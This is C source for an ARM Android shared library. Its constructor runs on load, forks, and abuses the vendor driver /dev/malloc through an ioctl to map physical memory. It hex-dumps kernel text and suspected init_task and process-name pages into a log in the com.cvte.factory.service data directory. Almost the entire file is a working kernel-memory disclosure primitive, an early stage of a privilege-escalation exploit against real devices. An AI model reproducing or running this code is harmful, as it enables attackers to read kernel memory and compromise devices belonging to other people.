typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long long u64;
#define SYS_open 5
#define SYS_close 6
#define SYS_write 4
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
#define SYS_exit 1
#define SYS_fork 2
static long sc(long n,long a,long b,long c,long d,long e,long f){register long r7 asm("r7")=n;register long r0 asm("r0")=a;register long r1 asm("r1")=b;register long r2 asm("r2")=c;register long r3 asm("r3")=d;register long r4 asm("r4")=e;register long r5 asm("r5")=f;asm volatile("svc #0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");return r0;}
static u32 slen(const char*s){u32 n=0;while(s[n])n++;return n;}
static void puts(int fd,const char*s){sc(SYS_write,fd,(long)s,slen(s),0,0,0);}
static void hx(int fd,u64 v){char b[17];int i;for(i=15;i>=0;i--){int d=v&0xf;b[i]=d<10?'0'+d:'a'+d-10;v>>=4;}b[16]=0;puts(fd,b);}
static void dec(int fd,long v){char b[32];int i=31;b[31]=0;if(v<0){puts(fd,"-");v=-v;}if(!v){puts(fd,"0");return;}while(v&&i){b[--i]='0'+v%10;v/=10;}puts(fd,b+i);}
struct info { u64 addr; u64 size; u64 interval; u8 miusel; u8 pad[7]; };
static int pfd=-1;
static void dump_at(int lf,u64 phys,int len){
  u64 page=phys&~0xfffULL; u32 off=(u32)(phys-page);
  struct info i; i.addr=page-0x20000000ULL; i.size=(len+off+0xfff)&~0xfffULL; i.interval=0; i.miusel=0;
  for(int k=0;k<7;k++)i.pad[k]=0;
  long r=sc(SYS_ioctl,pfd,0x80204d04,(long)&i,0,0,0);
  puts(lf,"PHYS ");hx(lf,phys);puts(lf," map_addr=");hx(lf,i.addr);puts(lf," size=");dec(lf,i.size);puts(lf," ioctl=");dec(lf,r);puts(lf,"\n");
  if(r<0)return;
  long p=sc(SYS_mmap2,0,(long)i.size,3,1,pfd,0);
  puts(lf,"mmap=");dec(lf,p);puts(lf,"\n"); if(p<0&&p>-4096)return;
  u8*b=(u8*)p+off; int n=len; if(n>0x800)n=0x800;
  for(int row=0;row<n;row+=16){puts(lf,"  ");hx(lf,phys+row);puts(lf,"  ");
    for(int c=0;c<16;c++){ if(row+c<n){u8 v=b[row+c];char h[3];h[0]="0123456789abcdef"[v>>4];h[1]="0123456789abcdef"[v&15];h[2]=0;puts(lf,h);puts(lf," ");}else puts(lf,"   ");}
    puts(lf," |");for(int c=0;c<16&&row+c<n;c++){u8 v=b[row+c];char ch=(v>=32&&v<127)?v:'.';sc(SYS_write,lf,(long)&ch,1,0,0,0);}puts(lf,"|\n");
  }
  sc(SYS_munmap,p,i.size,0,0,0,0);
}
static void run_child(void){
  const char *path="/data/data/com.cvte.factory.service/files/physdump.log";
  int lf=sc(SYS_open,(long)path,0x241,0666,0,0,0);
  if(lf<0)return;
  puts(lf,"START\n");
  pfd=sc(SYS_open,(long)"/dev/malloc",0x42,0666,0,0,0);
  puts(lf,"pfd=");dec(lf,pfd);puts(lf,"\n");
  if(pfd<0){sc(SYS_close,lf,0,0,0,0,0);return;}
  puts(lf,"D1\n");
  dump_at(lf,0x20300000ULL,0x40);      /* kernel text */
  puts(lf,"D2\n");
  dump_at(lf,0x213ae180ULL,0x200);     /* suspected init_task */
  puts(lf,"D3\n");
  dump_at(lf,0x313dd5e8ULL,0x100);     /* comm hit page */
  puts(lf,"DONE\n");
  sc(SYS_close,lf,0,0,0,0,0);
}
static void run(void){
  long pid=sc(SYS_fork,0,0,0,0,0,0);
  if(pid==0){ run_child(); sc(SYS_exit,0,0,0,0,0,0); }
}
__attribute__((constructor)) static void ctor(void){run();}
